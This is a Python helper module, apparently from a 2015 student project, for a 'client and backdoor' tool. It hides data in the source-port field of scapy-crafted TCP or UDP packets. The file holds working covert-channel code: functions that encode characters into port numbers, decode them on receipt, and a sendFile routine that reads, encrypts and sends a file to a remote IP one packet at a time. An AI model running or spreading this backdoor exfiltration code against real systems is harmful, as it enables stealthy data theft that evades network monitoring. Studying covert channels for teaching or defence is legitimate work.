#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    helpers.py -   helper methods for client and backdoor
#--
#-- FUNCTIONS:      chunkString(size, string)
#--                 createPacketTwo(protocol, ip, char1, char2, port)
#--                 createPacketOne(protocol, ip, char, port)
#--                 parsePacket(packet)
#--                 sendMessage(message, password, protocol, ip, port)
#--                 readOneByte(fileDescriptor)
#--                 sendFile(ip, filePath, protocol, port, password)
#--
#-- DATE:           November 29, 2015
#--
#-- PROGRAMMERS:    Brij Shah & Callum Styan
#--
#-- NOTES:
#-- Includes all file and packet handling methods for the client and backdoor
#-- application.
#-----------------------------------------------------------------------------


import binascii, time, os, ntpath, encryption, configfile, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

maxPort = 65535
# lastPosition = 0
# fileSize = 0

#-----------------------------------------------------------------------------
#-- FUNCTION:       chunkString(size, string)
#--
#-- VARIABLES(S):   size - size to chunk string into
#--                 string - string passed into to chunk into certain sizes
#--
#-- NOTES:
#-- Takes a string and splits it into chunks of specified size
#-----------------------------------------------------------------------------
# take string and break it into chunks of length size
def chunkString(size, string):
  chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
  return chunkedString


#-----------------------------------------------------------------------------
#-- FUNCTION:       createPacketTwo(protocol, ip, char1, char2, port)
#--
#-- VARIABLES(S):   protocol - protocol to use when crafting packet
#--                 ip - ip to send packet too
#--                 char1 - first character to place in source port
#--                 char2 - second character to place in source port
#--                 port - port to use as destination port
#--
#-- NOTES:
#-- Takes in two ascii characters and converts both into binary strings, 
#-- concatenates the strings and turns the result into an integer value. It then
#-- creates a packet with specified parameters from configuration file such as
#-- protocol and port. Returns a packet created by scapy.
#-----------------------------------------------------------------------------
def createPacketTwo(protocol, ip, char1, char2, port):
    # get the binary values of both chars without the binary string indicator
    binChar1 = bin(ord(char1))[2:].zfill(8)
    binChar2 = bin(ord(char2))[2:].zfill(8)
    # print binChar1 + binChar2
    # get the integer value of the concatenated binary values
    intPortVal = int(binChar1 + binChar2, 2)
    #print "bin value " + str((bin(intPortVal)))
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
    return packet


#-----------------------------------------------------------------------------
#-- FUNCTION:       createPacketOne(protocol, ip, char, port)
#--
#-- VARIABLES(S):   protocol - either TCP or UDP
#--                 ip - IP to send packet too
#--                 char - character to place into source port
#--                 port - port to use as destination port
#--
#-- NOTES:
#-- create a packet when we only have 1 character remaining in the file
#-- works exactly the same as createPacketTwo except we only have one character
#-- returns a packet created by scapy.
#-----------------------------------------------------------------------------
def createPacketOne(protocol, ip, char, port):
    # get the binary value of the character
    binChar = bin(ord(char))[2:].zfill(8)
    #print binChar
    #get the integer value of that binary value
    intPortVal = int(binChar, 2)
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
    return packet

#-----------------------------------------------------------------------------
#-- FUNCTION:       parsePacket(packet)
#--
#-- VARIABLES(S):   packet - the packet passed in from sniff
#--
#-- NOTES:
#-- takes in a packet that passes our sniff filter
#-- Gets the difference between 65535 and the source port field in the packet,
#-- then gets the binary value of that difference.  If the length of the binary
#-- string is greater than 8, then we parse 2 characters from the string, otherwise
#-- the string only contains one character.  We convert the binary string to an
#-- ASCII character.  You'll notice that we open and close the output file within
#-- this function, that's because pythons file library requires the file to be closed
#-- for the data from our write calls to actually be written to the file.
#-----------------------------------------------------------------------------
def parsePacket(packet):
    sport = packet.sport
    difference = maxPort - sport
    binVal = bin(difference)[2:]
    binLen = len(binVal)
    if binLen > 8:
        # binary string contains two ascii characters
        # the last 8 characters in the string are always the 2nd character
        binChar2 = binVal[-8:]
        # python trims leading zeroes at the start of our concatenated binary string
        binChar1 = binVal[0:binLen - 8]
        char1 = chr(int(binChar1, 2))
        char2 = chr(int(binChar2, 2))
        #print "Received: " + char1 + char2
        return str(char1 + char2)
    else:
        # binary string contains one ascii character
        char = chr(int(binVal, 2))
        #print "Received: " + char
        return str(char)

#-----------------------------------------------------------------------------
#-- FUNCTION:       sendMessage(message, password, protocol, ip, port)
#--
#-- VARIABLES(S):   message -
#--                 password - 
#--                 protocol - 
#--                 ip - 
#--                 port - 
#--
#-- NOTES:
#-- 
#-----------------------------------------------------------------------------
def sendMessage(message, password, protocol, ip, port):
  lastIndex = len(message) - 1
  for index, char in enumerate(message):
    packet = createPacketOne(protocol, ip, char, port)
    if index ==  lastIndex:
      packet = packet/Raw(load=password)
    send(packet, verbose=0)
    time.sleep(0.1) # we should check if this is actually necessary

#-----------------------------------------------------------------------------
#-- FUNCTION:       readOneByte(fileDescriptor)
#--
#-- VARIABLES(S):   fileDescriptor 
#--
#-- NOTES:
#-- 
#-----------------------------------------------------------------------------
def readOneByte(fileDescriptor):
    global lastPosition
    fileDescriptor.seek(lastPosition)
    byte = fileDescriptor.read(1)
    lastPosition = fileDescriptor.tell()
    return byte

def sendFile(ip, filePath, protocol, port, password):
    fileDescriptor = open(filePath, 'rb')
    header = ntpath.basename(filePath) + '\0'
    data = header + fileDescriptor.read()
    encryptedData = encryption.encrypt(data, configfile.masterkey)
    sendMessage(encryptedData, password, protocol, ip, port)
